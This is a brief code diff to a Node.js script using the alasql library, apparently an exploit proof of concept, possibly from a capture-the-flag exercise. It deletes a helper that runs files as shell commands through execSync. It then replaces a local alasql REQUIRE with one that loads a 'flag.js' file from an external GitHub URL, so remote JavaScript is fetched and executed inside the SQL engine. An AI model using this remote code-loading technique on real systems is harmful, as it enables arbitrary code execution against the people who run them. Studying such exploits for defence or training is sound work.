@@ -1,15 +1,6 @@
-function executeFile(filename) {
-  const { execSync } = require('child_process');
-  try {
-    return execSync(filename).toString();
-  } catch (error) {
-    return error.message;
-  }
-}
-
 const alasql = require('alasql');
 
-alasql('REQUIRE "./execfile.js"');
+alasql('REQUIRE "https://github.com/vr2/1/blob/main/flag.js"');
 
 alasql('CREATE TABLE WOO (content TEXT)');
 
